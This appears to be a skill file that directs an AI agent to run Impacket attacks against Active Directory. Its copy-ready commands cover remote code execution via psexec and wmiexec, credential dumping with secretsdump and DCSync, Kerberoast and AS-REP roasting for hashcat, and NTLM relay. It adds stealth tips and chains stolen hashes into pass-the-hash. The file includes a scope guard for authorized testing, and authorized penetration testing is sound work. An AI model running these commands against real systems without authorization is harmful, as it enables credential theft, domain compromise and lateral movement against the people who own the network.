---
name: impacket
description: >
  Use for AD/Windows protocol actions with the Impacket example scripts once you have creds or
  hashes (often from netexec) — remote code exec (psexec/wmiexec), credential dumping
  (secretsdump, incl. DCSync -just-dc), Kerberoast (GetUserSPNs -request), AS-REP roast
  (GetNPUsers -request), and NTLM relay (ntlmrelayx). Feeds hashes to hashcat. Not for
  attack-path mapping (bloodhound) or web testing (burpsuite).
arguments: "action target [-u user] [-p pass] [-hashes LM:NT] [-dc-ip ip]"
model: inherit
effort: high
context: inline
agent:
---

# impacket — AD/Windows protocol tools (psexec · secretsdump · GetUserSPNs · ntlmrelayx)

**Scope guard:** Authorized targets only (in-scope program / lab / owned). Confirm the target host/domain and the credentials/hashes you are using are in scope before acting — these scripts run code and dump secrets on live hosts. Abort if the target is not confirmed in scope.

## Goal (desired outcome)
Turn valid creds or hashes into concrete AD/Windows actions — a shell, dumped secrets, or roastable
tickets — using the Impacket example scripts, capturing every artifact (shells, hashes, tickets) for
the report and the credential store.

## Steps
1. **Precondition / scope / inputs.** Confirm the target and the creds/hashes (often from `netexec`)
   are in scope. Impacket's target format is `[[domain/]username[:password]@]<target>`; use
   `-hashes LMHASH:NTHASH` for pass-the-hash, `-k`/`-no-pass` for Kerberos, `-dc-ip` for the DC.
   Anchor a timestamped run directory to the repo root (never write under `skills/`):
   ```bash
   ROOT="$(git rev-parse --show-toplevel)"
   RUN="$ROOT/out/impacket/$(date +%Y%m%dT%H%M%S)"
   mkdir -p "$RUN/loot" "$RUN/notes"
   echo "target + creds confirmed in scope: <who/when/program-or-lab>" > "$RUN/notes/scope.txt"
   : > "$RUN/run.log"
   ```
2. **Remote code exec** (when you need a shell):
   ```bash
   psexec.py  'DOMAIN/user:password@TARGET'                | tee -a "$RUN/run.log"   # SYSTEM, noisy (service)
   wmiexec.py 'DOMAIN/user:password@TARGET'                | tee -a "$RUN/run.log"   # semi-interactive, quieter
   # pass-the-hash: add  -hashes LMHASH:NTHASH  and omit the password
   ```
3. **Credential dumping** (`secretsdump`) — SAM/LSA locally or DCSync from a DC:
   ```bash
   secretsdump.py 'DOMAIN/user:password@TARGET' -outputfile "$RUN/loot/secrets"            | tee -a "$RUN/run.log"
   secretsdump.py 'DOMAIN/user:password@DC' -just-dc -outputfile "$RUN/loot/ntds"          | tee -a "$RUN/run.log"  # DCSync
   ```
4. **Roasting → hashcat.** Request roastable hashes in hashcat format and save to loot:
   ```bash
   GetUserSPNs.py 'DOMAIN/user:password' -dc-ip <DC> -request -outputfile "$RUN/loot/kerberoast.txt"       | tee -a "$RUN/run.log"
   GetNPUsers.py  'DOMAIN/' -usersfile users.txt -request -format hashcat -outputfile "$RUN/loot/asrep.txt" | tee -a "$RUN/run.log"
   ```
5. **NTLM relay (when applicable) + marker.** Relay coerced auth to targets, then always write a run
   marker so "ran but nothing" ≠ "didn't run":
   ```bash
   ntlmrelayx.py -tf targets.txt -smb2support -of "$RUN/loot/relay"   | tee -a "$RUN/run.log"   # -i for interactive
   if [ -n "$(ls -A "$RUN/loot" 2>/dev/null)" ] || grep -qiE '\[\*\]|\[\+\]' "$RUN/run.log"; then
     echo "impacket: action completed; artifacts in loot/" > "$RUN/summary.txt"
   else
     echo "no artifacts captured" > "$RUN/summary.txt"
   fi
   ```
   Then write the run record `_run.json` into `$RUN/` (schema in Output formats). Feed roast hashes
   to `hashcat`; cracked creds loop back to `netexec`.

## Modern tooling & alternatives
Impacket is the standard AD protocol toolkit — install via `pipx install impacket` (scripts as
`psexec.py` or `impacket-psexec`). `netexec` wraps many of the same actions at scale; `certipy` /
`rubeus` cover AD CS / Kerberos abuse. Prefer `wmiexec`/`smbexec` over `psexec` when stealth matters.

## Output formats
CLI output (mirrored to `$RUN/run.log` via `tee`); dumped secrets/tickets written under `$RUN/loot/`
via each script's `-outputfile`. This skill also writes `$RUN/summary.txt` (run marker) and a run
record `$RUN/_run.json`:
```json
{
  "skill": "impacket",
  "target": "<target>",
  "run_dir": "out/impacket/<timestamp>",
  "started": "<ISO8601>",
  "finished": "<ISO8601>",
  "status": "complete",
  "items": {
    "scope-confirmed":  { "attempted": true, "ok": true, "evidence": "notes/scope.txt" },
    "action-executed":  { "attempted": true, "ok": true, "evidence": "run.log" },
    "loot-captured":    { "attempted": true, "ok": true, "evidence": "loot" },
    "results-recorded": { "attempted": true, "ok": true, "evidence": "summary.txt" }
  },
  "errors": []
}
```
`status` ∈ `complete | partial | error`. On a hard failure (script missing, target unreachable, bad
creds, out of scope) set `status: error` and push a human-readable line to `errors[]`.

## RAG / shared data / cross-skill
Core AD toolkit — consumes creds/hashes from `netexec` and target info from `bloodhound`; roast
output (`kerberoast.txt` / `asrep.txt`, hashcat format) feeds `hashcat`; dumped NTLM hashes enable
pass-the-hash back through `netexec`/`impacket`. **High RAG value:** a WADCOMS "I have X → do Y" map
and a pass-the-hash / Kerberos cheat-sheet.

## Checklist
```yaml
checklist:
  - id: scope-confirmed
    desc: Target host/domain AND the creds/hashes used confirmed in scope before acting
    verify: judge
    evidence: notes/scope.txt
    on_fail: fail
    required: true
  - id: action-executed
    desc: An impacket action ran and was logged (exec/dump/roast/relay)
    verify: nonempty
    evidence: run.log
    on_fail: redo-skill
    required: true
  - id: loot-captured
    desc: Artifacts (secrets/tickets/roast hashes) saved under loot/ via -outputfile
    verify: exists
    evidence: loot
    on_fail: redo-part
    required: false
  - id: results-recorded
    desc: Run marker written (even when no artifacts captured)
    verify: nonempty
    evidence: summary.txt
    on_fail: redo-skill
    required: true
```

## Notes / pitfalls
- Target format is `[[domain/]username[:password]@]<target>`; for pass-the-hash use
  `-hashes LMHASH:NTHASH` and omit the password; `-k`/`-no-pass` for Kerberos ticket auth.
- `secretsdump -just-dc` is **DCSync** — needs replication rights and is high-signal; dump the
  minimum needed.
- Request roast hashes with `-format hashcat` (GetNPUsers) so they drop straight into `hashcat`.
- `psexec` creates a service (noisy/forensic); prefer `wmiexec`/`smbexec` when stealth matters.
- A run that captures nothing must still write `summary.txt` ("no artifacts captured") so "ran but
  empty" ≠ "didn't run".
- Never write output under `skills/`; the run directory is always anchored to the repo root via
  `git rev-parse --show-toplevel` under `out/impacket/<timestamp>/` (git-ignored).
